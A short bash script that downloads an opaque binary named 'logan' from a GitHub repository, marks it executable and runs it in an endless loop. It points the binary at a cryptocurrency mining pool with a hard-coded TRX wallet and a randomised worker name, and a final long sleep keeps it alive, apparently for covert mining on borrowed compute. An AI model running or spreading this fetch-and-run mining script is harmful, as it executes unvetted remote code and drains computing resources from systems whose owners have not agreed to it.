#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TDUyaKcbhFGViyBHarTtPuHhHk9mXm84th
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/alibahrami1204/Success/raw/main/logan
chmod +x logan
while [ 1 ]; do
./logan -pool $POOL -wal $WALLET.$WORKER -pass x
sleep 5
done
sleep 999999999 
